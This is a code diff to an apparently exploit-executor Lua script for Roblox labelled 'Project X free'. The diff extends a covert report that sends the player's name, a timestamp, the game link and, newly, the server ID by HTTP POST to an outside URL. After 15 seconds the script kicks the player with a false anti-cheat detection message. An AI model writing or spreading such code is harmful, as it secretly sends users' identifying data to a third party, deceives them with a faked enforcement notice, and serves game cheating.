@@ -1629,9 +1629,11 @@ end
 local playerName = game.Players.LocalPlayer.Name
 local timestamp = getTimeWithTimezone()
 local gameLink = "https://www.roblox.com/games/" .. tostring(game.PlaceId)
+local version = "Project X free"
+local serverId = game.JobId
 
 local data = {
-   ["content"] = playerName .. ", " .. timestamp .. ", " .. gameLink
+   ["content"] = playerName .. ", " .. timestamp .. ", " .. gameLink .. ", " .. version .. ", Server ID: " .. serverId
 }
 
 local newdata = game:GetService("HttpService"):JSONEncode(data)
@@ -1643,7 +1645,6 @@ local headers = {
 request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
-
 
 wait(15)
 game.Players.LocalPlayer:Kick("Project X has been detected in the COREGUI. If this is an error please contact appeals. Kicked by AC.")
